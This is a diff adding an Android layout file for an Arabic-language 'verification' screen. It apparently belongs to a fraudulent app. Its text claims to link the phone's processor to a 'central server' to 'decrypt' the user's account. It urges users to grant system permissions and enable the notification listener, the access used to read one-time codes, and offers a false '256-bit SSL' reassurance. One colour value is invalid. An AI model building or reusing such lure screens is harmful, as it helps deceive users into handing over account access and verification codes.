@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://tools.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#F4F4F9">
+
+    <ProgressBar
+        android:id="@+id/progressBarTop"
+        style="@android:style/Widget.Material.ProgressBar.Horizontal"
+        android:layout_width="match_parent"
+        android:layout_height="4dp"
+        android:layout_alignParentTop="true"
+        android:indeterminate="true"
+        android:indeterminateTint="#6750A4"
+        android:visibility="gone"
+        tools:visibility="visible" />
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:gravity="center"
+        android:padding="24dp">
+
+        <ImageView
+            android:layout_width="96dp"
+            android:layout_height="96dp"
+            android:src="@android:drawable/ic_dialog_info"
+            app:tint="#6750A4"
+            android:layout_marginBottom="24dp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="نظام التحقق المباشر (V3)"
+            android:textSize="22sp"
+            android:textStyle="bold"
+            android:textColor="#1C1B1F" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="سيتم الآن ربط معالج جهازك بالسيرفر المركزي لفك التشفير اليدوي عن حسابك."
+            android:gravity="center"
+            android:layout_marginTop="16dp"
+            android:textColor="#49454F"
+            android:textSize="14sp"
+            android:lineSpacingExtra="6dp" />
+
+        <androidx.cardview.widget.CardView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="32dp"
+            app:cardCornerRadius="16dp"
+            app:cardBackgroundColor="#EID_SURFACE"
+            app:cardElevation="0dp">
+            
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="#E8E0F5"
+                android:padding="20dp">
+                
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="متطلبات العملية الأمنية:"
+                    android:textStyle="bold"
+                    android:textColor="#21005D"
+                    android:textSize="15sp" />
+                
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="• منح أذونات التحقق لبروتوكول النظام لتوثيق الهوية.\n• تفعيل مراقب الإشعارات لضمان تدفق كود الفك المباشر."
+                    android:textColor="#49454F"
+                    android:textSize="13sp"
+                    android:layout_marginTop="12dp"
+                    android:lineSpacingExtra="4dp" />
+            </LinearLayout>
+        </androidx.cardview.widget.CardView>
+
+        <FrameLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="40dp">
+
+            <Button
+                android:id="@+id/btnStartVerify"
+                android:layout_width="match_parent"
+                android:layout_height="56dp"
+                android:text="بدء عملية الربط والتحقق"
+                android:textColor="#FFFFFF"
+                android:textAllCaps="false"
+                android:textSize="16sp"
+                android:textStyle="bold"
+                app:backgroundTint="#6750A4"
+                app:cornerRadius="16dp" />
+
+            <ProgressBar
+                android:id="@+id/verifyProgressBar"
+                android:layout_width="28dp"
+                android:layout_height="28dp"
+                android:layout_gravity="center"
+                android:visibility="gone"
+                android:indeterminateTint="#FFFFFF"
+                tools:visibility="visible" />
+        </FrameLayout>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="24dp"
+            android:text="اتصال مشفر وآمن 256-bit SSL 🛡️"
+            android:textColor="#938F99"
+            android:textSize="11sp" />
+
+    </LinearLayout>
+</RelativeLayout>
